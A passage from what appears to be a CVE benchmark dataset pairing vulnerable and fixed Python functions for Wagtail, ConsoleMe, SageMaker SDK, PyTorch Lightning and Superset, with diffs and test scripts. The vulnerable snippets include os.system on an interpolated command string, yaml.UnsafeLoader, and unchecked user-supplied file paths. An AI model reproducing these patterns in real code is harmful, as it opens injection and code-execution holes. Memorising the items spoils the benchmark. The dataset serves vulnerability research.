'comment': comment,\n                        'replies': replies,\n                    }\n                    for comment, replies in changes['new_replies']\n                    if comment.pk in threads\n                ]\n            })\n\n        return send_notification(global_recipient_users, 'updated_comments', {\n            'page': self.page,\n            'editor': self.request.user,\n            'new_comments': changes['new_comments'],\n            'resolved_comments': changes['resolved_comments'],\n            'deleted_comments': changes['deleted_comments'],\n            'replied_comments': [\n                {\n                    'comment': comment,\n                    'replies': replies,\n                }\n                for comment, replies in changes['new_replies']\n            ]\n        })"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_16_1",
        "commit": "5fe901e",
        "file_path": "wagtail/admin/views/pages/edit.py",
        "start_line": 121,
        "end_line": 197,
        "snippet": "    def send_commenting_notifications(self, changes):\n        \"\"\"\n        Sends notifications about any changes to comments to anyone who is subscribed.\n        \"\"\"\n        relevant_comment_ids = []\n        relevant_comment_ids.extend(comment.pk for comment in changes['resolved_comments'])\n        relevant_comment_ids.extend(comment.pk for comment, replies in changes['new_replies'])\n\n        # Skip if no changes were made\n        # Note: We don't email about edited comments so ignore those here\n        if (not changes['new_comments']\n                and not changes['deleted_comments']\n                and not changes['resolved_comments']\n                and not changes['new_replies']):\n            return\n\n        # Get global page comment subscribers\n        subscribers = PageSubscription.objects.filter(page=self.page, comment_notifications=True).select_related('user')\n        global_recipient_users = [subscriber.user for subscriber in subscribers if subscriber.user != self.request.user]\n\n        # Get subscribers to individual threads\n        replies = CommentReply.objects.filter(comment_id__in=relevant_comment_ids)\n        comments = Comment.objects.filter(id__in=relevant_comment_ids)\n        thread_users = get_user_model().objects.exclude(pk=self.request.user.pk).exclude(pk__in=subscribers.values_list('user_id', flat=True)).filter(\n            Q(comment_replies__comment_id__in=relevant_comment_ids) | Q(**{('%s__pk__in' % COMMENTS_RELATION_NAME): relevant_comment_ids})\n        ).prefetch_related(\n            Prefetch('comment_replies', queryset=replies),\n            Prefetch(COMMENTS_RELATION_NAME, queryset=comments)\n        )\n\n        # Skip if no recipients\n        if not (global_recipient_users or thread_users):\n            return\n        thread_users = [(user, set(list(user.comment_replies.values_list('comment_id', flat=True)) + list(getattr(user, COMMENTS_RELATION_NAME).values_list('pk', flat=True)))) for user in thread_users]\n        mailed_users = set()\n\n        for current_user, current_threads in thread_users:\n            # We are trying to avoid calling send_notification for each user for performance reasons\n            # so group the users receiving the same thread notifications together here\n            if current_user in mailed_users:\n                continue\n            users = [current_user]\n            mailed_users.add(current_user)\n            for user, threads in thread_users:\n                if user not in mailed_users and threads == current_threads:\n                    users.append(user)\n                    mailed_users.add(user)\n            send_notification(users, 'updated_comments', {\n                'page': self.page,\n                'editor': self.request.user,\n                'new_comments': [comment for comment in changes['new_comments'] if comment.pk in threads],\n                'resolved_comments': [comment for comment in changes['resolved_comments'] if comment.pk in threads],\n                'deleted_comments': [],\n                'replied_comments': [\n                    {\n                        'comment': comment,\n                        'replies': replies,\n                    }\n                    for comment, replies in changes['new_replies']\n                    if comment.pk in threads\n                ]\n            })\n\n        return send_notification(global_recipient_users, 'updated_comments', {\n            'page': self.page,\n            'editor': self.request.user,\n            'new_comments': changes['new_comments'],\n            'resolved_comments': changes['resolved_comments'],\n            'deleted_comments': changes['deleted_comments'],\n            'replied_comments': [\n                {\n                    'comment': comment,\n                    'replies': replies,\n                }\n                for comment, replies in changes['new_replies']\n            ]\n        })"
      }
    ],
    "vul_patch": "--- a/wagtail/admin/views/pages/edit.py\n+++ b/wagtail/admin/views/pages/edit.py\n@@ -21,11 +21,11 @@\n         # Get subscribers to individual threads\n         replies = CommentReply.objects.filter(comment_id__in=relevant_comment_ids)\n         comments = Comment.objects.filter(id__in=relevant_comment_ids)\n-        thread_users = get_user_model().objects.exclude(pk=self.request.user.pk).exclude(pk__in=subscribers.values_list('user_id', flat=True)).prefetch_related(\n+        thread_users = get_user_model().objects.exclude(pk=self.request.user.pk).exclude(pk__in=subscribers.values_list('user_id', flat=True)).filter(\n+            Q(comment_replies__comment_id__in=relevant_comment_ids) | Q(**{('%s__pk__in' % COMMENTS_RELATION_NAME): relevant_comment_ids})\n+        ).prefetch_related(\n             Prefetch('comment_replies', queryset=replies),\n             Prefetch(COMMENTS_RELATION_NAME, queryset=comments)\n-        ).exclude(\n-            Q(comment_replies__isnull=True) & Q(**{('%s__isnull' % COMMENTS_RELATION_NAME): True})\n         )\n \n         # Skip if no recipients\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2022-21683:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/wagtail\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2022-21683/bin/python ./wagtail/tests/manage.py test wagtail.admin.tests.pages.test_edit_page.TestCommenting.assertNeverEmailedWrongUser wagtail.admin.tests.pages.test_edit_page.TestCommenting.test_new_comment\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2022-21683:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/wagtail\ngit apply --whitespace=nowarn /workspace/fix.patch /workspace/dep.patch \n/workspace/PoC_env/CVE-2022-21683/bin/python ./wagtail/tests/manage.py test wagtail.admin.tests.pages.test_edit_page \n"
  },
  {
    "cve_id": "CVE-2024-5023",
    "cve_description": "Improper Neutralization of Special Elements used in a Command ('Command Injection') vulnerability in Netflix ConsoleMe allows Command Injection.This issue affects ConsoleMe: before 1.4.0.",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/Netflix/consoleme",
    "patch_url": [
      "https://github.com/Netflix/consoleme/commit/2795a2bd553938a21c0643b37452971625ce67f5"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_231_1",
        "commit": "b746782",
        "file_path": "consoleme/lib/templated_resources/requests.py",
        "start_line": 27,
        "end_line": 213,
        "snippet": "async def generate_honeybee_request_from_change_model_array(\n    request_creation: RequestCreationModel, user: str, extended_request_uuid: str\n) -> ExtendedRequestModel:\n    repositories_for_request = {}\n    primary_principal = None\n    t = int(time.time())\n    generated_branch_name = f\"{user}-{t}\"\n    policy_name = config.get(\n        \"generate_honeybee_request_from_change_model_array.policy_name\",\n        \"self_service_generated\",\n    )\n    repo_config = None\n\n    # Checkout Git Repo and generate a branch name for the user's change\n    for change in request_creation.changes.changes:\n        if primary_principal and change.principal != primary_principal:\n            raise Exception(\"Changes must all affect the same principal\")\n        primary_principal = change.principal\n        discovered_repository_for_change = False\n        if repositories_for_request.get(change.principal.repository_name):\n            continue\n        # Find repo\n        for r in config.get(\"cache_resource_templates.repositories\", []):\n            if r[\"name\"] == change.principal.repository_name:\n                repo_config = r\n                repo = Repository(\n                    r[\"repo_url\"], r[\"name\"], r[\"authentication_settings\"][\"email\"]\n                )\n                await repo.clone(depth=1)\n                git_client = repo.git\n                git_client.reset()\n                git_client.checkout(b=generated_branch_name)\n                repositories_for_request[change.principal.repository_name] = {\n                    \"main_branch_name\": r[\"main_branch_name\"],\n                    \"repo\": repo,\n                    \"git_client\": git_client,\n                    \"config\": r,\n                }\n                discovered_repository_for_change = True\n                break\n        if not discovered_repository_for_change:\n            raise Exception(\n                \"No matching repository found for change in ConsoleMe's configuration\"\n            )\n    request_changes = ChangeModelArray(changes=[])\n    affected_templates = []\n    for change in request_creation.changes.changes:\n        git_client = repositories_for_request[change.principal.repository_name][\n            \"git_client\"\n        ]\n        repo = repositories_for_request[change.principal.repository_name][\"repo\"].repo\n        main_branch_name = repositories_for_request[change.principal.repository_name][\n            \"main_branch_name\"\n        ]\n        git_client.checkout(\n            f\"origin/{main_branch_name}\", change.principal.resource_identifier\n        )\n        change_file_path = f\"{repo.working_dir}/{change.principal.resource_identifier}\"\n        with open(change_file_path, \"r\") as f:\n            yaml_content = yaml.load(f)\n\n        # Original\n        buf = io.BytesIO()\n        yaml.dump(yaml_content, buf)\n        original_text = buf.getvalue()\n        successfully_merged_statement = False\n        if not yaml_content.get(\"Policies\"):\n            yaml_content[\"Policies\"] = []\n        if isinstance(yaml_content[\"Policies\"], dict):\n            yaml_content[\"Policies\"] = [yaml_content[\"Policies\"]]\n\n        # The PolicyModel is a representation of a single (usually inline) policy that a user has requested be merged\n        # into a given template. If the policy is provided as a string, it's the contents of the full file (which\n        # should include the user's requested change)\n        if isinstance(change.policy, PolicyModel):\n            if isinstance(change.policy.policy_document[\"Statement\"], str):\n                change.policy.policy_document[\"Statement\"] = [\n                    change.policy.policy_document[\"Statement\"]\n                ]\n            for i in range(len(yaml_content.get(\"Policies\", []))):\n                policy = yaml_content[\"Policies\"][i]\n                if policy.get(\"PolicyName\") != policy_name:\n                    continue\n                if policy.get(\"IncludeAccounts\") or policy.get(\"ExcludeAccounts\"):\n                    raise ValueError(\n                        f\"The {policy_name} policy has IncludeAccounts or ExcludeAccounts set\"\n                    )\n                successfully_merged_statement = True\n\n                policy[\"Statement\"].extend(\n                    CommentedSeq(change.policy.policy_document[\"Statement\"])\n                )\n                yaml_content[\"Policies\"][i][\n                    \"Statement\"\n                ] = await minimize_iam_policy_statements(\n                    json.loads(json.dumps(policy[\"Statement\"]))\n                )\n            if not successfully_merged_statement:\n                yaml_content[\"Policies\"].append(\n                    {\n                        \"PolicyName\": policy_name,\n                        \"Statement\": change.policy.policy_document[\"Statement\"],\n                    }\n                )\n            with open(change_file_path, \"w\") as f:\n                yaml.dump(yaml_content, f)\n            # New\n            buf = io.BytesIO()\n            yaml.dump(yaml_content, buf)\n            updated_text = buf.getvalue()\n\n        elif isinstance(change.policy, str):\n            # If the change is provided as a string, it represents the full change\n            updated_text = change.policy\n            with open(change_file_path, \"w\") as f:\n                f.write(updated_text)\n        else:\n            raise Exception(\n                \"Unable to parse change from Honeybee templated role change request\"\n            )\n\n        request_changes.changes.append(\n            GenericFileChangeModel(\n                principal=primary_principal,\n                action=\"attach\",\n                change_type=\"generic_file\",\n                policy=updated_text,\n                old_policy=original_text,\n                encoding=\"yaml\",\n            )\n        )\n        git_client.add(change.principal.resource_identifier)\n        affected_templates.append(change.principal.resource_identifier)\n\n    pull_request_url = \"\"\n    if not request_creation.dry_run:\n        commit_title = f\"ConsoleMe Generated PR for {', '.join(affected_templates)}\"\n        commit_message = (\n            f\"This request was made through ConsoleMe Self Service\\n\\nUser: {user}\\n\\n\"\n            f\"Justification: {request_creation.justification}\"\n        )\n\n        git_client.commit(m=commit_message)\n        git_client.push(u=[\"origin\", generated_branch_name])\n        if repo_config[\"code_repository_provider\"] == \"bitbucket\":\n            bitbucket = BitBucket(\n                repo_config[\"code_repository_config\"][\"url\"],\n                config.get(\n                    repo_config[\"code_repository_config\"][\"username_config_key\"]\n                ),\n                config.get(\n                    repo_config[\"code_repository_config\"][\"password_config_key\"]\n                ),\n            )\n            pull_request_url = await bitbucket.create_pull_request(\n                repo_config[\"project_key\"],\n                repo_config[\"name\"],\n                repo_config[\"project_key\"],\n                repo_config[\"name\"],\n                generated_branch_name,\n                repo_config[\"main_branch_name\"],\n                commit_title,\n                commit_message,\n            )\n        else:\n            raise Exception(\n                f\"Unsupported `code_repository_provider` specified in configuration: {repo_config}\"\n            )\n\n    for repo_name, repo_details in repositories_for_request.items():\n        await repo_details[\"repo\"].cleanup()\n\n    if not pull_request_url and not request_creation.dry_run:\n        raise Exception(\"Unable to generate pull request URL\")\n\n    return ExtendedRequestModel(\n        id=extended_request_uuid,\n        request_url=pull_request_url,\n        principal=primary_principal,\n        timestamp=int(time.time()),\n        requester_email=user,\n        approvers=[],\n        request_status=RequestStatus.pending,\n        changes=request_changes,\n        requester_info=UserModel(\n            email=user,\n            extended_info=await auth.get_user_info(user),"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_231_1",
        "commit": "2795a2b",
        "file_path": "consoleme/lib/templated_resources/requests.py",
        "start_line": 30,
        "end_line": 235,
        "snippet": "async def generate_honeybee_request_from_change_model_array(\n    request_creation: RequestCreationModel, user: str, extended_request_uuid: str\n) -> ExtendedRequestModel:\n    repositories_for_request = {}\n    primary_principal = None\n    t = int(time.time())\n    suffix = \"\".join(\n        random.choices(string.ascii_lowercase + string.digits, k=10)  # nosec\n    )\n    generated_branch_name = f\"{user}-{t}-{suffix}\"\n    policy_name = config.get(\n        \"generate_honeybee_request_from_change_model_array.policy_name\",\n        \"self_service_generated\",\n    )\n    repo_config = None\n\n    # Checkout Git Repo and generate a branch name for the user's change\n    for change in request_creation.changes.changes:\n        if primary_principal and change.principal != primary_principal:\n            raise Exception(\"Changes must all affect the same principal\")\n        primary_principal = change.principal\n        discovered_repository_for_change = False\n        if repositories_for_request.get(change.principal.repository_name):\n            continue\n        # Find repo\n        for r in config.get(\"cache_resource_templates.repositories\", []):\n            if r[\"name\"] == change.principal.repository_name:\n                repo_config = r\n                repo = Repository(\n                    r[\"repo_url\"], r[\"name\"], r[\"authentication_settings\"][\"email\"]\n                )\n                await repo.clone(depth=1)\n                git_client = repo.git\n                git_client.reset()\n                git_client.checkout(b=generated_branch_name)\n                repositories_for_request[change.principal.repository_name] = {\n                    \"main_branch_name\": r[\"main_branch_name\"],\n                    \"repo\": repo,\n                    \"git_client\": git_client,\n                    \"config\": r,\n                }\n                discovered_repository_for_change = True\n                break\n        if not discovered_repository_for_change:\n            raise Exception(\n                \"No matching repository found for change in ConsoleMe's configuration\"\n            )\n    request_changes = ChangeModelArray(changes=[])\n    affected_templates = []\n    for change in request_creation.changes.changes:\n        git_client = repositories_for_request[change.principal.repository_name][\n            \"git_client\"\n        ]\n        repo = repositories_for_request[change.principal.repository_name][\"repo\"].repo\n        main_branch_name = repositories_for_request[change.principal.repository_name][\n            \"main_branch_name\"\n        ]\n\n        change_file_path = os.path.abspath(\n            f\"{repo.working_dir}/{change.principal.resource_identifier}\"\n        )\n        clone_wd_path = os.path.abspath(repo.working_dir)\n        if os.path.commonprefix((clone_wd_path, change_file_path)) != clone_wd_path:\n            log.exception(\n                f\"User attempted to reference a file outside of the repository: {change_file_path} is not within {clone_wd_path}\"\n            )\n            raise ValueError(\"Unable to raise change request for this resource\")\n\n        try:\n            git_client.checkout(\n                f\"origin/{main_branch_name}\", \"--\", change.principal.resource_identifier\n            )\n        except Exception:\n            log.exception(\n                f\"Unable to checkout {main_branch_name} for {change.principal.resource_identifier}\"\n            )\n            raise ValueError(\"Unable to raise change request for this resource\")\n        with open(change_file_path, \"r\") as f:\n            yaml_content = yaml.load(f)\n\n        # Original\n        buf = io.BytesIO()\n        yaml.dump(yaml_content, buf)\n        original_text = buf.getvalue()\n        successfully_merged_statement = False\n        if not yaml_content.get(\"Policies\"):\n            yaml_content[\"Policies\"] = []\n        if isinstance(yaml_content[\"Policies\"], dict):\n            yaml_content[\"Policies\"] = [yaml_content[\"Policies\"]]\n\n        # The PolicyModel is a representation of a single (usually inline) policy that a user has requested be merged\n        # into a given template. If the policy is provided as a string, it's the contents of the full file (which\n        # should include the user's requested change)\n        if isinstance(change.policy, PolicyModel):\n            if isinstance(change.policy.policy_document[\"Statement\"], str):\n                change.policy.policy_document[\"Statement\"] = [\n                    change.policy.policy_document[\"Statement\"]\n                ]\n            for i in range(len(yaml_content.get(\"Policies\", []))):\n                policy = yaml_content[\"Policies\"][i]\n                if policy.get(\"PolicyName\") != policy_name:\n                    continue\n                if policy.get(\"IncludeAccounts\") or policy.get(\"ExcludeAccounts\"):\n                    raise ValueError(\n                        f\"The {policy_name} policy has IncludeAccounts or ExcludeAccounts set\"\n                    )\n                successfully_merged_statement = True\n\n                policy[\"Statement\"].extend(\n                    CommentedSeq(change.policy.policy_document[\"Statement\"])\n                )\n                yaml_content[\"Policies\"][i][\n                    \"Statement\"\n                ] = await minimize_iam_policy_statements(\n                    json.loads(json.dumps(policy[\"Statement\"]))\n                )\n            if not successfully_merged_statement:\n                yaml_content[\"Policies\"].append(\n                    {\n                        \"PolicyName\": policy_name,\n                        \"Statement\": change.policy.policy_document[\"Statement\"],\n                    }\n                )\n            with open(change_file_path, \"w\") as f:\n                yaml.dump(yaml_content, f)\n            # New\n            buf = io.BytesIO()\n            yaml.dump(yaml_content, buf)\n            updated_text = buf.getvalue()\n\n        elif isinstance(change.policy, str):\n            # If the change is provided as a string, it represents the full change\n            updated_text = change.policy\n            with open(change_file_path, \"w\") as f:\n                f.write(updated_text)\n        else:\n            raise Exception(\n                \"Unable to parse change from Honeybee templated role change request\"\n            )\n\n        request_changes.changes.append(\n            GenericFileChangeModel(\n                principal=primary_principal,\n                action=\"attach\",\n                change_type=\"generic_file\",\n                policy=updated_text,\n                old_policy=original_text,\n                encoding=\"yaml\",\n            )\n        )\n        git_client.add(change.principal.resource_identifier)\n        affected_templates.append(change.principal.resource_identifier)\n\n    pull_request_url = \"\"\n    if not request_creation.dry_run:\n        commit_title = f\"ConsoleMe Generated PR for {', '.join(affected_templates)}\"\n        commit_message = (\n            f\"This request was made through ConsoleMe Self Service\\n\\nUser: {user}\\n\\n\"\n            f\"Justification: {request_creation.justification}\"\n        )\n\n        git_client.commit(m=commit_message)\n        git_client.push(u=[\"origin\", generated_branch_name])\n        if repo_config[\"code_repository_provider\"] == \"bitbucket\":\n            bitbucket = BitBucket(\n                repo_config[\"code_repository_config\"][\"url\"],\n                config.get(\n                    repo_config[\"code_repository_config\"][\"username_config_key\"]\n                ),\n                config.get(\n                    repo_config[\"code_repository_config\"][\"password_config_key\"]\n                ),\n            )\n            pull_request_url = await bitbucket.create_pull_request(\n                repo_config[\"project_key\"],\n                repo_config[\"name\"],\n                repo_config[\"project_key\"],\n                repo_config[\"name\"],\n                generated_branch_name,\n                repo_config[\"main_branch_name\"],\n                commit_title,\n                commit_message,\n            )\n        else:\n            raise Exception(\n                f\"Unsupported `code_repository_provider` specified in configuration: {repo_config}\"\n            )\n\n    for repo_name, repo_details in repositories_for_request.items():\n        await repo_details[\"repo\"].cleanup()\n\n    if not pull_request_url and not request_creation.dry_run:\n        raise Exception(\"Unable to generate pull request URL\")\n\n    return ExtendedRequestModel(\n        id=extended_request_uuid,\n        request_url=pull_request_url,\n        principal=primary_principal,\n        timestamp=int(time.time()),\n        requester_email=user,\n        approvers=[],\n        request_status=RequestStatus.pending,\n        changes=request_changes,\n        requester_info=UserModel(\n            email=user,\n            extended_info=await auth.get_user_info(user),"
      }
    ],
    "vul_patch": "--- a/consoleme/lib/templated_resources/requests.py\n+++ b/consoleme/lib/templated_resources/requests.py\n@@ -4,7 +4,10 @@\n     repositories_for_request = {}\n     primary_principal = None\n     t = int(time.time())\n-    generated_branch_name = f\"{user}-{t}\"\n+    suffix = \"\".join(\n+        random.choices(string.ascii_lowercase + string.digits, k=10)  # nosec\n+    )\n+    generated_branch_name = f\"{user}-{t}-{suffix}\"\n     policy_name = config.get(\n         \"generate_honeybee_request_from_change_model_array.policy_name\",\n         \"self_service_generated\",\n@@ -52,10 +55,26 @@\n         main_branch_name = repositories_for_request[change.principal.repository_name][\n             \"main_branch_name\"\n         ]\n-        git_client.checkout(\n-            f\"origin/{main_branch_name}\", change.principal.resource_identifier\n+\n+        change_file_path = os.path.abspath(\n+            f\"{repo.working_dir}/{change.principal.resource_identifier}\"\n         )\n-        change_file_path = f\"{repo.working_dir}/{change.principal.resource_identifier}\"\n+        clone_wd_path = os.path.abspath(repo.working_dir)\n+        if os.path.commonprefix((clone_wd_path, change_file_path)) != clone_wd_path:\n+            log.exception(\n+                f\"User attempted to reference a file outside of the repository: {change_file_path} is not within {clone_wd_path}\"\n+            )\n+            raise ValueError(\"Unable to raise change request for this resource\")\n+\n+        try:\n+            git_client.checkout(\n+                f\"origin/{main_branch_name}\", \"--\", change.principal.resource_identifier\n+            )\n+        except Exception:\n+            log.exception(\n+                f\"Unable to checkout {main_branch_name} for {change.principal.resource_identifier}\"\n+            )\n+            raise ValueError(\"Unable to raise change request for this resource\")\n         with open(change_file_path, \"r\") as f:\n             yaml_content = yaml.load(f)\n \n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-34073",
    "cve_description": "sagemaker-python-sdk is a library for training and deploying machine learning models on Amazon SageMaker. In affected versions the capture_dependencies function in `sagemaker.serve.save_retrive.version_1_0_0.save.utils` module allows for potentially unsafe Operating System (OS) Command Injection if inappropriate command is passed as the \u201crequirements_path\u201d parameter. This consequently may allow an unprivileged third party to cause remote code execution, denial of service, affecting both confidentiality and integrity. This issue has been addressed in version 2.214.3. Users are advised to upgrade. Users unable to upgrade should not override the \u201crequirements_path\u201d parameter of capture_dependencies function in `sagemaker.serve.save_retrive.version_1_0_0.save.utils`, and instead use the default value.",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/aws/sagemaker-python-sdk",
    "patch_url": [
      "https://github.com/aws/sagemaker-python-sdk/commit/2d873d53f708ea570fc2e2a6974f8c3097fe9df5"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_125_1",
        "commit": "d27836e",
        "file_path": "src/sagemaker/serve/save_retrive/version_1_0_0/save/utils.py",
        "start_line": 77,
        "end_line": 105,
        "snippet": "def capture_dependencies(requirements_path: str):\n    \"\"\"Placeholder docstring\"\"\"\n    logger.info(\"Capturing dependencies...\")\n\n    try:\n        import pigar\n\n        pigar.__version__  # pylint: disable=W0104\n    except ModuleNotFoundError:\n        logger.warning(\n            \"pigar module is not installed in python environment, \"\n            \"dependency generation may be incomplete\"\n            \"Checkout the instructions on the installation page of its repo: \"\n            \"https://github.com/damnever/pigar \"\n            \"And follow the ones that match your environment.\"\n            \"Please note that you may need to restart your runtime after installation.\"\n        )\n        import sagemaker\n\n        sagemaker_dependency = f\"{sagemaker.__package__}=={sagemaker.__version__}\"\n        with open(requirements_path, \"w\") as f:\n            f.write(sagemaker_dependency)\n        return\n\n    command = f\"pigar gen -f {Path(requirements_path)} {os.getcwd()}\"\n    logging.info(\"Running command %s\", command)\n\n    os.system(command)\n    logger.info(\"Dependencies captured successfully\")"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_125_1",
        "commit": "2d873d5",
        "file_path": "src/sagemaker/serve/save_retrive/version_1_0_0/save/utils.py",
        "start_line": 78,
        "end_line": 106,
        "snippet": "def capture_dependencies(requirements_path: str):\n    \"\"\"Placeholder docstring\"\"\"\n    logger.info(\"Capturing dependencies...\")\n\n    try:\n        import pigar\n\n        pigar.__version__  # pylint: disable=W0104\n    except ModuleNotFoundError:\n        logger.warning(\n            \"pigar module is not installed in python environment, \"\n            \"dependency generation may be incomplete\"\n            \"Checkout the instructions on the installation page of its repo: \"\n            \"https://github.com/damnever/pigar \"\n            \"And follow the ones that match your environment.\"\n            \"Please note that you may need to restart your runtime after installation.\"\n        )\n        import sagemaker\n\n        sagemaker_dependency = f\"{sagemaker.__package__}=={sagemaker.__version__}\"\n        with open(requirements_path, \"w\") as f:\n            f.write(sagemaker_dependency)\n        return\n\n    command = [\"pigar\", \"gen\", \"-f\", str(Path(requirements_path)), str(os.getcwd())]\n    logging.info(\"Running command: %s\", \" \".join(command))\n\n    subprocess.run(command, check=True, capture_output=True)\n    logger.info(\"Dependencies captured successfully\")"
      }
    ],
    "vul_patch": "--- a/src/sagemaker/serve/save_retrive/version_1_0_0/save/utils.py\n+++ b/src/sagemaker/serve/save_retrive/version_1_0_0/save/utils.py\n@@ -22,8 +22,8 @@\n             f.write(sagemaker_dependency)\n         return\n \n-    command = f\"pigar gen -f {Path(requirements_path)} {os.getcwd()}\"\n-    logging.info(\"Running command %s\", command)\n+    command = [\"pigar\", \"gen\", \"-f\", str(Path(requirements_path)), str(os.getcwd())]\n+    logging.info(\"Running command: %s\", \" \".join(command))\n \n-    os.system(command)\n+    subprocess.run(command, check=True, capture_output=True)\n     logger.info(\"Dependencies captured successfully\")\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2021-4118",
    "cve_description": "pytorch-lightning is vulnerable to Deserialization of Untrusted Data",
    "cwe_info": {
      "CWE-502": {
        "name": "Deserialization of Untrusted Data",
        "description": "The product deserializes untrusted data without sufficiently ensuring that the resulting data will be valid."
      }
    },
    "repo": "https://github.com/pytorchlightning/pytorch-lightning",
    "patch_url": [
      "https://github.com/pytorchlightning/pytorch-lightning/commit/62f1e82e032eb16565e676d39e0db0cac7e34ace"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_76_1",
        "commit": "8508cce",
        "file_path": "pytorch_lightning/core/saving.py",
        "start_line": "325",
        "end_line": "355",
        "snippet": "def load_hparams_from_yaml(config_yaml: str, use_omegaconf: bool = True) -> Dict[str, Any]:\n    \"\"\"Load hparams from a file.\n\n        Args:\n            config_yaml: Path to config yaml file\n            use_omegaconf: If omegaconf is available and ``use_omegaconf=True``,\n                the hparams will be converted to ``DictConfig`` if possible.\n\n    >>> hparams = Namespace(batch_size=32, learning_rate=0.001, data_root='./any/path/here')\n    >>> path_yaml = './testing-hparams.yaml'\n    >>> save_hparams_to_yaml(path_yaml, hparams)\n    >>> hparams_new = load_hparams_from_yaml(path_yaml)\n    >>> vars(hparams) == hparams_new\n    True\n    >>> os.remove(path_yaml)\n    \"\"\"\n    fs = get_filesystem(config_yaml)\n    if not fs.exists(config_yaml):\n        rank_zero_warn(f\"Missing Tags: {config_yaml}.\", category=RuntimeWarning)\n        return {}\n\n    with fs.open(config_yaml, \"r\") as fp:\n        hparams = yaml.load(fp, Loader=yaml.UnsafeLoader)\n\n    if _OMEGACONF_AVAILABLE:\n        if use_omegaconf:\n            try:\n                return OmegaConf.create(hparams)\n            except (UnsupportedValueType, ValidationError):\n                pass\n    return hparams"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_76_1",
        "commit": "62f1e82",
        "file_path": "pytorch_lightning/core/saving.py",
        "start_line": "325",
        "end_line": "355",
        "snippet": "def load_hparams_from_yaml(config_yaml: str, use_omegaconf: bool = True) -> Dict[str, Any]:\n    \"\"\"Load hparams from a file.\n\n        Args:\n            config_yaml: Path to config yaml file\n            use_omegaconf: If omegaconf is available and ``use_omegaconf=True``,\n                the hparams will be converted to ``DictConfig`` if possible.\n\n    >>> hparams = Namespace(batch_size=32, learning_rate=0.001, data_root='./any/path/here')\n    >>> path_yaml = './testing-hparams.yaml'\n    >>> save_hparams_to_yaml(path_yaml, hparams)\n    >>> hparams_new = load_hparams_from_yaml(path_yaml)\n    >>> vars(hparams) == hparams_new\n    True\n    >>> os.remove(path_yaml)\n    \"\"\"\n    fs = get_filesystem(config_yaml)\n    if not fs.exists(config_yaml):\n        rank_zero_warn(f\"Missing Tags: {config_yaml}.\", category=RuntimeWarning)\n        return {}\n\n    with fs.open(config_yaml, \"r\") as fp:\n        hparams = yaml.full_load(fp)\n\n    if _OMEGACONF_AVAILABLE:\n        if use_omegaconf:\n            try:\n                return OmegaConf.create(hparams)\n            except (UnsupportedValueType, ValidationError):\n                pass\n    return hparams"
      }
    ],
    "vul_patch": "--- a/pytorch_lightning/core/saving.py\n+++ b/pytorch_lightning/core/saving.py\n@@ -20,7 +20,7 @@\n         return {}\n \n     with fs.open(config_yaml, \"r\") as fp:\n-        hparams = yaml.load(fp, Loader=yaml.UnsafeLoader)\n+        hparams = yaml.full_load(fp)\n \n     if _OMEGACONF_AVAILABLE:\n         if use_omegaconf:\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2021-28125",
    "cve_description": "Apache Superset up to and including 1.0.1 allowed for the creation of an external URL that could be malicious. By not checking user input for open redirects the URL shortener functionality would allow for a malicious user to create a short URL for a dashboard that could convince the user to click the link.",
    "cwe_info": {
      "CWE-601": {
        "name": "URL Redirection to Untrusted Site ('Open Redirect')",
        "description": "The web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a redirect."
      }
    },
    "repo": "https://github.com/apache/superset",
    "patch_url": [
      "https://github.com/apache/superset/commit/eb35b804acf4d84cb70d02743e04b8afebbee029"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_167_1",
        "commit": "e8162cb",
        "file_path": "superset/views/redirects.py",
        "start_line": 28,
        "end_line": 60,
